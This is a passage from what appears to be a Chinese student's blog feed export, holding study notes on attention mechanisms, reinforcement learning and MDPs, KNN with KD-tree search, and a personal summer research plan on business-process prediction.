title="特征工程——模型外部的注意力机制"></a>特征工程——模型外部的注意力机制</h3><p>严格来说，「注意力机制」更像是一种方法论。没有严格的数学定义，而是根据具体任务目标，对关注的方向和加权模型进行调整。<br>简单的理解就是，在神经网络的隐藏层，增加「注意力机制」的加权。<br>使不符合注意力模型的内容弱化或者遗忘。</p><p><img src="http://files.shanqianche.cn/2021717/1626502007361.png" alt="特征工程"></p><h3 id="“key-query-value”理论"><a href="#“key-query-value”理论" class="headerlink" title="“key-query-value”理论"></a>“key-query-value”理论</h3><p><img src="http://files.shanqianche.cn/2021717/1626502458858.png" alt="Attention机制"></p><p>将Source中的构成元素想象成是由一系列的&lt;Key,Value&gt;数据对构成，此时给定Target中的某个元素Query，通过计算Query和各个Key的相似性或者相关性，得到每个Key对应Value的权重系数，然后对Value进行加权求和，即得到了最终的Attention数值。所以本质上Attention机制是对Source中元素的Value值进行加权求和，而Query和Key用来计算对应Value的权重系数。即可以将其本质思想改写为如下公式：<br>$Attention( Q u e r y , Source ) = \sum _ { i = 1 } ^ { L _ { x } }Similarity(Query,Key_{i})*Value_{i}$</p><blockquote><p><strong><font color="#7FFF00">个人理解</font></strong><br>可以把attention机制看作一种软寻址：Source可以看作存储器内存储的内容，元素由地址Key和值Value组成，当前有个Key=Query的查询，目的是取出存储器中对应的Value值，即Attention数值。通过Query和存储器内元素Key的地址进行相似性比较来寻址，之所以说是软寻址，指的不像一般寻址只从存储内容里面找出一条内容，而是可能从每个Key地址都会取出内容，**<font color="#7FFF00">取出内容的重要性根据Query和Key的相似性来决定</font>**，之后对Value进行加权求和，这样就可以取出最终的Value值，也即Attention值。</p></blockquote><p><strong><font color="#008B8B">Attention机制的具体计算过程：</font></strong></p><p><img src="http://files.shanqianche.cn/2021717/1626508762885.png" alt="计算过程"></p><ol><li>根据Query和Key计算两者的相似性或者相关性【学习】</li><li>对第一阶段的原始分值进行归一化处理【获取权重系数】</li><li>根据权重系数对Value进行加权求和</li></ol><blockquote><p><strong><font color="#00008B">知识补充</font></strong><br>点乘又叫向量的内积、数量积，是一个向量和它在另一个向量上的投影的长度的乘积；是标量。 <strong>点乘反映着两个向量的“相似度”</strong>，两个向量越“相似”，它们的点乘越大。<br>向量叉乘求的是<strong>垂直</strong>于这两个向量<br>Cosine相似性，求余弦<br>多层感知器（Multilayer Perceptron,缩写MLP）一种通用的函数近似方法，可以被用来拟合复杂的函数，或解决分类问题</p></blockquote><p>第一阶段中根据Query和Key求相似度目前常见的方法包括：求两者的向量点积、求两者的向量 Cosine相似性或者通过再引入额外的<br>神经网络来求值如下：<br>点积：<br>$Similarity(Query,Key_{i})=Query*Key_{i}$</p><p>Cosine相似性：<br>$Similarity(Query,Key_{i})=\frac { Query<em>Key_{i} } { ||Query||</em>||Key_{i}||}$</p><p>MLP网络：<br>$Similarity(Query,Key_{i})=MLP（Query*Key_{i}$</p><p>第二阶段引入类似SoftMax的计算方式对第一阶段的相似度得分进行数值转换，一方面可以进行归一化，将原始计算分值整理成所有元素权重之和为1的概率分布；另一方面也可以通过SoftMax的内在机制更加突出重要元素的权重。<br>$a_{i}=Softmax(Sim_{i})= \frac{e^{Sim_{i}}}{ \textstyle \sum_{j=1}^{L_{x}}e^{Sim_{j}} }$</p><p>最后一阶段是加权求和求Attention数值：<br>$Attention(Query,Source)={\textstyle \sum_{i=1}^{L_{x}}a_{i}\cdot Value_{i}}$</p><h2 id="深度学习领域的注意力机制"><a href="#深度学习领域的注意力机制" class="headerlink" title="深度学习领域的注意力机制"></a>深度学习领域的注意力机制</h2><h3 id="注意力机制的思想和基本框架"><a href="#注意力机制的思想和基本框架" class="headerlink" title="注意力机制的思想和基本框架"></a>注意力机制的思想和基本框架</h3><blockquote><p>一些学者尝试让<font color="#9400D3">模型自己学习如何分配自己的注意力</font>，即为输入信号加权。<em>他们用注意力机制的直接目的，就是为输入的各个维度打分，然后按照得分对特征加权，以突出重要特征对下游模型或模块的影响。这也是注意力机制的基本思想。</em></p></blockquote><p><strong>一般会采用”key-query-value”理论来描述注意力机制的机理。</strong></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> algorithm </tag>
            
            <tag> process mining </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强化学习</title>
      <link href="/2021/07/13/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/07/13/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/steven-yang/p/6481772.html">强化学习读书笔记 - 00 - 术语和数学符号 - SNYang - 博客园</a><br><a href="https://www.cnblogs.com/wacc/p/5391209.html">强化学习笔记1 - Hiroki - 博客园</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>监督学习在机器学习中取得了重大的成功，然而在<strong>顺序决策制定</strong>和<strong>控制问题</strong>中，比如无人直升机、无人汽车等，难以给出显式的监督信息，因此这类问题中<strong>监督模型无法学习</strong>。<br>强化学习就是为了解决这类问题而产生的。在强化学习框架中，学习算法被称为一个agent，假设这个agent处于一个环境中，两者之间存在交互。<font color="#9400D3">agent通过与环境交互不断增强对环境的适应力，故得名强化学习。</font></p><p><img src="http://files.shanqianche.cn/2021713/1626145210759.png" alt="强化学习"></p><p>在每个时间步 $t$ ，agent：</p><ul><li>接受状态 $s _ { t }$</li><li>接受标量回报 $r _ { t }$</li><li>执行行动 $a _ { t }$</li></ul><p>环境：</p><ul><li>接受动作 $a _ { t }$</li><li>产生状态 $s _ { t }$</li><li>产生标量回报 $r _ { t }$</li></ul><h2 id="MDP-马尔科夫决策过程"><a href="#MDP-马尔科夫决策过程" class="headerlink" title="MDP(马尔科夫决策过程)"></a>MDP(马尔科夫决策过程)</h2><p>通常我们都是从MDP（马尔科夫决策过程）来了解强化学习的。MDP问题中，我们有一个五元组： $( S , A , P , \gamma , P )$</p><ul><li>$S$ :状态集，由agent所有可能的状态组成</li><li>$A$ :动作集，由agent所有可能的行动构成</li><li>$P ( s , a , s ^ { \prime } )$ :转移概率分布，表示状态s下执行动作a后下个时刻状态的概率分布</li><li>$\gamma$ :折扣因子，0≤ $\gamma$ ≤1，表示未来回报相对于当前回报的重要程度。如果 $\gamma$ =0，表示只重视当前立即回报； $\gamma$ =1表示将未来回报视为与当前回报同等重要。【<font color="#FF8C00">这块不懂，可以看后面下围棋的栗子</font>】</li><li>$R ( s , a , s ^ { \prime } )$ :标量立即回报函数。执行动作a，导致状态s转移到s′产生的回报。可以是关于状态-动作的函数 $S \times A \rightarrow R$ ，也可以是只关于状态的函数 $S \rightarrow R$ 。记t时刻的回报为 $r _ { t }$ ，为了后续表述方便，假设我们感兴趣的问题中回报函数只取决于状态，而状态-动作函数可以很容易地推广，这里暂不涉及。</li></ul><p><strong><font color="#8B008B">注：</font></strong> 这里阐述的MDP称为discounted MDP，即<font color="#00008B">带折扣因子的MDP</font>。有些MDP也可以定义为四元组： $( S , A , P , R )$ ，这是<em>因为这类MDP中使用的值函数不考虑折扣因子</em>。</p><blockquote><p>**<font color="#9932CC">马尔可夫性质</font>*<em>：当一个随机过程在给定现在状态及所有过去状态情况下，其未来状态的条件概率分布<font color="#006400">仅依赖于当前状态</font>；换句话说，在给定现在状态时，它与过去状态（即该过程的历史路径）是<font color="#1E90FF">条件独立</font>的，那么此随机过程即具有马尔可夫性质。<br>例如：</em>明天的天气（是否下大雨）仅与今天的天气（是否刮大风）有关，而与前天及以前的天气无关*。</p></blockquote><p>MDP过程具有马尔科夫性质，即给定当前状态，未来的状态与过去的状态无关。但与马尔科夫链不同的是，MDP还考虑了<strong>动作</strong>，也就是说MDP中状态的转移不仅和状态有关，还依赖于agent采取的动作。</p><p>我们可以通过下面表格了解各种马尔科夫模型的区别：</p><table><thead><tr><th></th><th>不考虑动作</th><th>考虑动作</th></tr></thead><tbody><tr><td>状态可观测</td><td>马尔科夫链（MC）</td><td>马尔科夫决策过程（MDP）</td></tr><tr><td>状态不完全可观测</td><td>隐马尔科夫模型（HMM）</td><td>不完全可观察马尔可夫决策过程（POMDP）</td></tr></tbody></table><p><strong><font color="#FF8C00">MDP的运行过程：</font></strong><br><img src="http://files.shanqianche.cn/2021713/1626158954807.png" alt="MDP"></p><p>我们从初始状态 $s _ { 0 }$ 出发，执行某个动作 $a _ { 0 }$ ，根据转移概率分布确定下一个状态 $s _ { 1 }$ ∼ $P _ { s0a0 }$ ，接着执行动作 $a _ { 1 }$ ，再根据 $P _ { s1a1 }$ 确定 $s _ { 2 }$ …。</p><p>一个discounted MDP中，我们的目标最大化一个<font color="#1E90FF">累积未来折扣回报</font>:<br>$R _ { t } = \sum _ { k = 0 } ^ { \infty } \gamma ^ { k } r _ { t + k + 1 }$</p><p>具体地，我们希望学得一个<strong>策略</strong>（policy），通过执行这个策略使上式最大化。策略一般可以表示为一个函数，它以<font color="#9932CC">状态</font>为输入，输出<font color="#9932CC">对应的动作</font>。策略函数可以是确定的 $\pi ( s ) = a$ ，也可以是不确定的  $\pi ( s , a ) = p ( a | s )$ （这时策略函数是一个<em>条件概率分布</em>，表示给定状态s下执行下一个动作a的概率）。当agent执行一个策略时，每个状态下agent都执行策略指定的动作。</p><p>强化学习通常具有<strong>延迟回报</strong>的特点，以下围棋为例，只有在最终决定胜负的那个时刻才有回报（赢棋为1，输棋为-1），而之前的时刻立即回报均为0。这种情况下， $R _ { t }$ 等于1或-1，这将导致我们很难衡量策略的优劣，因为即使赢了一盘棋，未必能说明策略中每一步都是好棋；同样输了一盘棋也未必能说明每一步都是坏棋。因此我们需要一个目标函数来刻画策略的长期效用。<br>为此，我们可以为策略定义一个<strong>值函数</strong>（value function）来综合评估某个策略的好坏。这个函数既可以是只关于状态的值函数 $V ^ { \pi } ( s )$ ，也可以状态-动作值函数 $Q ^ { \pi } ( s , a )$ 。<font color="#2F4F4F">状态值函数评估agent处于某个状态下的长期收益</font>， 动作值函数评估agent在某个状态下执行某个动作的长期收益。</p><p>本文后续都将以 <strong><font color="#FF8C00">状态值函</font></strong> 数为例，进行阐述。一般常用的有三种形式：</p><ol><li>$V ^ { \pi } ( s ) = E _ { \pi } [ \sum _ { k = 0 } ^ { \infty } r _ { t + k + 1 } | s _ { t } = s ]$</li><li>$V ^ { \pi } ( s ) = E _ { \pi } [ \lim _ { k \rightarrow \infty } \frac { 1 } { k } \sum _ { i = 0 } ^ { k } T _ { t + i + 1 } | s _ { t } = s ]$</li><li>$V ^ { \pi } ( s ) = E _ { \pi } [ \sum _ { k = 0 } ^ { \infty } \gamma ^ { k } r _ { t + k + 1 } | s _ { t } = s ]$</li></ol><p>其中 $E _ { \pi } [ \cdot | s _ { t } = s ]$ 表示从状态s开始，通过执行策略 $π$  得到的累积回报的期望。有些情况下，agent和环境的交互是无止境的，比如一些控制问题，这样的问题称为 <strong><font color="#9400D3">continuing task</font></strong> 。还有一种情况是我们可以把交互过程打散成一个个 **<font color="#9400D3">片段式任务</font>**（episodic task），每个片段有一个起始态和一个终止态（或称为吸收态，absorbing state），比如下棋。当每个episode结束时，我们对整个过程重启随机设置一个起始态或者从某个随机起始分布采样决定一个起始态。<br>上面三种值函数中，我们一般常用第三种形式，我把它叫做 **<font color="#9400D3">折扣值函数</font>**（discounted value function）。</p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
            <tag> machine leaning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暑假学习安排以及前段学习总结</title>
      <link href="/2021/07/11/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E5%AE%89%E6%8E%92%E4%BB%A5%E5%8F%8A%E5%89%8D%E6%AE%B5%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
      <url>/2021/07/11/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E5%AE%89%E6%8E%92%E4%BB%A5%E5%8F%8A%E5%89%8D%E6%AE%B5%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="已完成–前段时间"><a href="#已完成–前段时间" class="headerlink" title="已完成–前段时间"></a>已完成–前段时间</h2><ol><li>观看学习了吴恩达的机器学习课程视频，观看的主要的目的是对于机器学习有个整体的观念，同时我也学到了机器学习实验中简单的调参，验证以及最后结果的分析。</li><li>总结性的略读了几篇业务流程中对于异常的检测的paper，主要还是通过根据时间特征来检测事件的状态，主要包括有：<ul><li>基于时间边界的事件异常检测【通过对事件划分时间边界】</li><li>基于关键路径【确认业务流程关键路径，比对花费所时间】</li><li>通过对于执行时间建模方法来预测【即构建所有活动持续时间直立方图，然后通过比对当前节点和余下节点在图中占比来预测】</li><li>综合时间模型和流程步骤分析【综合运用时间统计模型和通过多个步骤分析方法生成运行时间概率分布、计算异常概率、与阈值比较的方法，提出一种基于运行的异常预测算法来预测工作流中的时间异常，该算法分为即设计时段和运行时段两个阶段，在设计时段，生成该模型所有可能产生的运行轨迹，并计算它们的预计执行时间的概率分布；在运行时段，通过分析计算流程超时的可能性与预设的阈值做比较来判断是否预测为异常】</li></ul></li><li>精读了2019年较为新的paper【基于机器学习的流程异常预测方法】，文中作者提出一种混合模型，就是结合了通过标注时间时间来对超期异常预测，但是由于系统执行时间很容易受到环境等因素导致超过人工标注时间，所以作者提出了通过机器学习学习各个事件在整个流程的流程所消费的时间占比来预测异常。自己对于其中的算法和模型都进行详细了解，同时结合以前略读的论文，感觉这篇论文就是结合了一下前人的方法，没有实际创新点。</li><li>整理了关于业务流程预测中的详细研究方向：<pre><code>- 预测完成一个案件的剩余时间- 流程预测结果评估【二元评估】- 预测下一个事件</code></pre></li><li>对于业务流程预测下一事件进行系统学习【只完成了部分,这一部分吗主要是2016年以前的论文，即普遍是用机器模型，而更复杂的深度学习模型是2016年后被应用到】：<ul><li>利用数据的时间分类特征来预测，使用更高阶马尔可夫模型（HMMs，这里指的是隐马尔可夫模型）和使用序列比对的流程结果来预测过程的下一个步骤。个人理解就是将序列KNN与HMMs相结合，通过HMMs学习数据，获得高阶模型，然后混合了序列KNN的替换矩阵，利用局部序列对比，<strong>降低了高阶HMMs的弱覆盖的缺陷影响</strong>。</li><li>针对处理半结构化业务流程数据，提出一种针对特定事件进程的模型（PPM），个人学习理解它作为过渡模型，主要负责学习记录半结构化业务流程的实例，和替换矩阵，然后映射到扩展马尔可夫链预测【当遇到并行事务的时候通过递归的方式学习转换矩阵】，作者的优点主要体现在针对<strong>半结构化业务流程数据</strong>进行预测。 </li></ul></li></ol><h2 id="未完成及原因–前段时间"><a href="#未完成及原因–前段时间" class="headerlink" title="未完成及原因–前段时间"></a>未完成及原因–前段时间</h2><ol><li>机器学习还是需要实操来检验自己所理解的知识，但是由于前期花费在理论上的时间比较多，同花了很多时间在数学上，虽然准备了环境准备实操但是也没有按时完成，也搁浅了。</li><li>在系统了解学习对于业务异常检测的时候中，还有两篇关于结合积极语义模型和受病毒传播启发病毒传染模型启发的时间延迟传播模型的预测检测的方法没有阅读，主要由于后面确认了自己要研究预测下一步，所以就没有继续阅读了。</li><li>在预测行为异常的论文中多次提到了对数据进行初始标注，但是都没有详细说明，所以这块没有详细研究，后面也没继续关注</li><li>本来应该在七月底将2016年前关于业务流程预测下一步的几篇全部看完，但是由于中间整理实验数据跑一下基本的模型【结果也没跑，数据量过大，笔记本不行，在挖掘流程的时候就很卡】，还有遇到了考试月就耽误了</li></ol><h2 id="暑假安排"><a href="#暑假安排" class="headerlink" title="暑假安排"></a>暑假安排</h2><ol><li>7.25号之前将剩下的四五篇关键论文看完【2016年前】</li><li>8.20系统学习看一下深度学习中在流程预测的使用，目前查阅的主要有循环神经网络，MMs，语法感知技术，基于过程发现技术，基于自动机的预测技术等，我现在收集了相关14篇论文【有一些是重复的改进模型】，开始可能看的慢一点，后面应该会快一点</li><li>读深度学习相关论文的时候，开始我会阅读最早的三四篇，然后后面倒着读剩下的，这样一旦有idea也能知道自己的想法是不是与最新的重复了。</li><li>9.17-9.27回家过个中秋，同时发小结婚</li></ol><h2 id="期望"><a href="#期望" class="headerlink" title="期望"></a>期望</h2><ol><li>老师前面提到与公司项目相结合，使用公司的数据，我当时考虑的是使用公工数据集，这样有对比也易于发表，现在我能想到的是，本来后面要帮老师做那个RPA程序，就想的后面在大论文中加入一部分流程挖掘，正好可以利用公司的日志信息挖掘，然后根据数据训练模型【这一块明天有空和老师聊一下哇，因为老师让我做的那块貌似没有日志哇，所以交流一下哇】</li><li>在我阅读业务流程预测论文的过程中，我开始发现预测事件由传统机器学习中的序列匹配开始向深度学习中的NLP靠拢，通过学习事件之间的因果来预测下一步，可能这块研究没有NLP那么超前，所以基本模型没有配套，但是依旧可以向他们学习，这样更加容易改进模型发表paper</li></ol>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> summarize </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> paper </tag>
            
            <tag> machine learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KNN（K近邻法 K Nearest Neighbors）</title>
      <link href="/2021/07/05/KNN%EF%BC%88K%E8%BF%91%E9%82%BB%E6%B3%95%20K%20Nearest%20Neighbors%EF%BC%89/"/>
      <url>/2021/07/05/KNN%EF%BC%88K%E8%BF%91%E9%82%BB%E6%B3%95%20K%20Nearest%20Neighbors%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/25994179">一文搞懂k近邻（k-NN）算法（一） - 知乎</a></p><p><a href="https://blog.csdn.net/qq_20412595/article/details/82013677">机器学习算法（2）之K近邻算法_不曾走远的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/pxhdky/article/details/85080980">【机器学习】K近邻法（KNN）与kd树原理详解_齐在的专栏-CSDN博客</a></p><p>TODO 序列KNN</p><h2 id="KNN概述"><a href="#KNN概述" class="headerlink" title="KNN概述"></a>KNN概述</h2><ul><li>常用有监督学习方法</li><li>常用分类方法</li><li>同时也是回归方法</li><li>是懒惰学习</li></ul><blockquote><p><font color="#ff7500">扩展学习</font><br>懒惰学习是一种训练集处理方法，其会<font color="#012C54">在收到测试样本的同时进行训练</font>，与之相对的是急切学习，其会<font color="#8A2BE2">在训练阶段开始对样本进行学习</font>处理。</p></blockquote><p><font color="#FF8C00">基本思路：</font><br>如果一个待分类样本在特征空间中的k个最相似(即特征空间中K近邻)的样本中的大多数属于某一个类别，则该样本也属于这个类别，即近朱者赤，近墨者黑。</p><h2 id="KNN算法介绍"><a href="#KNN算法介绍" class="headerlink" title="KNN算法介绍"></a>KNN算法介绍</h2><h3 id="KNN模型"><a href="#KNN模型" class="headerlink" title="KNN模型"></a>KNN模型</h3><p><strong>kNN使用的模型实际上对应于对特征空间的划分。</strong></p><p><font color="#006400">由三个及基本要素组成：</font></p><ul><li>距离度量</li><li>k值的选择</li><li>决策规划</li></ul><ol><li>距离度量</li></ol><p>KNN中使用的距离度量可以是欧式距离、曼哈顿距离、切比雪夫距离或者一般的闵可夫斯基距离。</p><blockquote><p><font color="#9932CC">知识补充</font><br>设特征空间 $X$ 是 $n$ 维实数向量空间<math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>R</mi><mi>n</mi></msup></math>，<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>x</mi><mi>i</mi></msub><mo>,</mo><msub><mi>x</mi><mi>j</mi></msub></math>∈ $X$ ，<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>x</mi><mi>i</mi></msub><mo>=</mo><mo>(</mo><msubsup><mi>x</mi><mi>i</mi><mrow><mo>(</mo><mn>1</mn><mo>)</mo></mrow></msubsup><mo>,</mo><msubsup><mi>x</mi><mi>i</mi><mrow><mo>(</mo><mn>2</mn><mo>)</mo></mrow></msubsup><mo>)</mo><mo>,</mo><mo>&#x22EF;</mo><mo>,</mo><msubsup><mi>x</mi><mi>i</mi><mrow><mo>(</mo><mi>n</mi><mo>)</mo></mrow></msubsup><msup><mo>)</mo><mi>T</mi></msup></math>，<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>x</mi><mi>j</mi></msub><mo>=</mo><mo>(</mo><msubsup><mi>x</mi><mi>j</mi><mrow><mo>(</mo><mn>1</mn><mo>)</mo></mrow></msubsup><mo>,</mo><msubsup><mi>x</mi><mi>j</mi><mrow><mo>(</mo><mn>2</mn><mo>)</mo></mrow></msubsup><mo>)</mo><mo>,</mo><mo>&#x22EF;</mo><mo>,</mo><msubsup><mi>x</mi><mi>j</mi><mrow><mo>(</mo><mi>n</mi><mo>)</mo></mrow></msubsup><msup><mo>)</mo><mi>T</mi></msup></math></p><ol><li><p>闵可夫斯基距离（Minkowski distance,<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>L</mi><mi>p</mi></msub></math>距离）<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>x</mi><mi>i</mi></msub><mo>,</mo><msub><mi>x</mi><mi>j</mi></msub></math>的<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>L</mi><mi>p</mi></msub></math>距离定义为：<br><img src="http://files.shanqianche.cn/202175/1625491452207.png"><br>其中，p ≥ 1 。 </p></li><li><p>曼哈顿距离（Manhattan distance）<br>当p = 1 时，<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>L</mi><mi>p</mi></msub></math>距离就变成了曼哈顿距离：<br><img src="http://files.shanqianche.cn/202175/1625491491032.png"></p></li><li><p>欧式距离（Euclidean distance）<br>当p = 2时，<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>L</mi><mi>p</mi></msub></math>距离就变成了欧式距离：<br><img src="http://files.shanqianche.cn/202175/1625491674920.png"></p></li><li><p>切比雪夫距离（Chebyshev distance）<br>当<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>p</mi><mo>=</mo><mo>&#x221E;</mo><mo>,</mo><msub><mi>L</mi><mi>p</mi></msub></math>距离就变成了切比雪夫距离，它是各个坐标距离的最大值：<br><img src="http://files.shanqianche.cn/202175/1625491693716.png"></p></li></ol></blockquote><ol start="2"><li>k值选择（借鉴李航–统计学习方法）</li></ol><p>如果k值较小，则训练误差减少，只有与输入实例相似的训练实例才会对于预测结果起作用,“学习”<font color="#D2691E">近似误差会减小</font>，但泛化误差提高了，预测结果会对近邻实例点非常敏感。k值较小意味着模型变得复杂，容易发生<font color="#0000FF">过拟合</font>。</p><p>如果k值较大，可以减少泛化误差，其优点是可以<font color="#D2691E">减少学习的估计误差</font>，但训练误差会增加，这时与输入实例相差较远的训练实例也会对预测结果起作用。k值较大意味着模型变得简单，容易发生<font color="#0000FF">欠拟合</font>。</p><p>通常情况下，我们需要对 k 经过多种尝试，来决定到底使用多大的 k 来作为最终参数。k通常会在3～10直接取值，或者是k等于训练数据的<font color="#DC143C">平方根</font>。比如15个数据，可能会取k=4。<br>第二种方法，选择能使测试集达到最优的k kk，即能够使得如MAPE等衡量预测准确度的统计量达到最小；<br>第三种方法，同时训练多个函数不同参数k kk的模型，然后取所有模型的预测值的平均值作为最终的预测值。</p><p>当k = 1时，k近邻算法就是最近邻算法。k值一般<font color="#FF1493">采用交叉验证法选取最优值</font>。</p><ol start="3"><li>决策规划</li></ol><p>通常，在分类任务中使用投票法计算最终预测结果，在回归任务中使用平均法，还可基于距离远近进行加权平均或加权投票。</p><h3 id="KNN算法描述"><a href="#KNN算法描述" class="headerlink" title="KNN算法描述"></a>KNN算法描述</h3><p>下面以<font color="#008B8B">分类</font>任务为例，介绍KNN算法，回归任务与此类似，区别不大。</p><p>输入：训练数据集<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>D</mi><mo>=</mo><mo>{</mo><mo>(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>,</mo><msub><mi>y</mi><mi>i</mi></msub><mo>)</mo><msubsup><mo>}</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup></math>    ，其中，<img src="http://files.shanqianche.cn/202175/1625492364666.png"> 是实例的类别。<br>过程：</p><ul><li>根据给定的距离度量，在训练集D中找出与x最邻近的k个点，涵盖着k 个点的领域记为<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>N</mi><mi>k</mi></msub><mo>(</mo><mi>x</mi><mo>)</mo></math>；</li><li>在<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>N</mi><mi>k</mi></msub><mo>(</mo><mi>x</mi><mo>)</mo></math>中根据分类决策规则决定x的类别y： <img src="http://files.shanqianche.cn/202175/1625492543638.png" alt="所属类别"><br>输出：测试样本x xx所属的类别y yy。</li></ul><h2 id="KNN算法实现"><a href="#KNN算法实现" class="headerlink" title="KNN算法实现"></a>KNN算法实现</h2><h3 id="KNN算法蛮力实现"><a href="#KNN算法蛮力实现" class="headerlink" title="KNN算法蛮力实现"></a>KNN算法蛮力实现</h3><p> 首先我们看看最想当然的方式。</p><pre><code> 既然我们要找到k个最近的邻居来做预测，那么我们只需要计算预测样本和所有训练集中的样本的距离，然后计算出最小的k个距离即可，接着多数表决，很容易做出预测。这个方法的确简单直接，在样本量少，样本特征少的时候有效。但是在实际运用中很多时候用不上，为什么呢？因为我们经常碰到样本的特征数有上千以上，样本量有几十万以上，如果我们这要去预测少量的测试集样本，算法的时间效率很成问题。因此，这个方法我们一般称之为蛮力实现。&lt;font color=&quot;#1E90FF&quot;&gt;比较适合于少量样本的简单模型的时候用&lt;/font&gt;。</code></pre><h3 id="KD树实现原理"><a href="#KD树实现原理" class="headerlink" title="KD树实现原理"></a>KD树实现原理</h3><pre><code>KD树算法没有一开始就尝试对测试样本分类，而是先对训练集建模，建立的模型就是KD树，建好了模型再对测试集做预测。所谓的KD树就是K个特征维度的树，注意这里的K和KNN中的K的意思不同。KNN中的K代表特征输出类别，KD树中的K代表样本特征的维数。为了防止混淆，后面我们称特征维数为n。</code></pre><p>KD树算法包括三步，第一步是建树，第二部是搜索最近邻，最后一步是预测。</p><h4 id="KD树的建立"><a href="#KD树的建立" class="headerlink" title="KD树的建立"></a>KD树的建立</h4><p>我们首先来看建树的方法。KD树建树采用的是从m个样本的n维特征中，分别计算n个特征的取值的方差，用<font color="#DC143C">方差最大</font>的第k维特征<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>n</mi><mi>k</mi></msub></math>来作为<font color="#B22222">根节点</font>。对于这个特征，我们选择特征<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>n</mi><mi>k</mi></msub></math>的取值的中位数<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>n</mi><mi>kv</mi></msub></math>对应的样本作为划分点，对于所有第k维特征的取值小于<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>n</mi><mi>kv</mi></msub></math>的样本，我们划入左子树，对于第k维特征的取值大于等于<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>n</mi><mi>kv</mi></msub></math>的样本，我们划入右子树，对于左子树和右子树，我们采用和刚才同样的办法来找方差最大的特征来做<font color="#B22222">根节点，递归</font>的生成KD树。</p><p><img src="http://files.shanqianche.cn/202175/1625494718364.png" alt="构建KD树"></p><p>比如我们有二维样本6个，{(2,3)，(5,4)，(9,6)，(4,7)，(8,1)，(7,2)}，构建kd树的具体步骤为：</p><ol><li>找到划分的特征。6个数据点在x，y维度上的数据方差分别为6.97，5.37，所以在x轴上方差更大，用第1维特征建树。</li><li>确定划分点（7,2）。根据x维上的值将数据排序，6个数据的中值(所谓中值，即中间大小的值)为7，所以划分点的数据是（7,2）。这样，该节点的分割超平面就是通过（7,2）并垂直于：划分点维度的直线x=7；（很显然，中位数为6 ，这里选择（5,4）或者(7,2)都是可以的。这种情况任选一个即可）</li><li>确定左子空间和右子空间。 分割超平面x=7将整个空间分为两部分：x&lt;=7的部分为左子空间，包含3个节点={(2,3),(5,4),(4,7)}；另一部分为右子空间，包含2个节点={(9,6)，(8,1)}。</li><li>用同样的办法划分左子树的节点{(2,3),(5,4),(4,7)}和右子树的节点{(9,6)，(8,1)}。最终得到KD树。</li><li>后续步骤反复上面的，<font color="#8FBC8F">直到两个子区域没有实例存在时停止（这意味着最后所有训练实例都对应一个叶结点或内部结点），从而形成kd树的区域划分</font>。</li></ol><p><img src="http://files.shanqianche.cn/202175/1625495422262.png" alt="KD树"></p><p><font color="#DC143C">标准kNN算法的切分特征选择是按顺序的，后来对kd树的一个重大改进是选择方差最大的特征，方差越大，不同实例点区分越明显，更方便进行划分。</font></p><h4 id="KD树搜索最近邻"><a href="#KD树搜索最近邻" class="headerlink" title="KD树搜索最近邻"></a>KD树搜索最近邻</h4><p>当我们生成KD树以后，就可以去预测测试集里面的样本目标点了。对于一个目标点，我们<font color="#9932CC">首先在KD树里面找到包含目标点的叶子节点</font>。<font color="#0000FF">以目标点为圆心，以目标点到叶子节点样本实例的距离为半径，得到一个超球体</font>，<font color="#B22222">最近邻的点一定在这个超球体内部</font>。然后返回叶子节点的父节点，检查另一个子节点包含的超矩形体是否和超球体相交，如果相交就到这个子节点寻找是否有更加近的近邻,有的话就更新最近邻。如果不相交那就简单了，我们直接返回父节点的父节点，在另一个子树继续搜索最近邻。当回溯到根节点时，算法结束，此时保存的最近邻节点就是最终的最近邻。</p><p><img src="http://files.shanqianche.cn/202175/1625496230689.png" alt="目标点为（2，4.5）"></p><p>从上面的描述可以看出，KD树划分后可以大大减少无效的最近邻搜索，很多<font 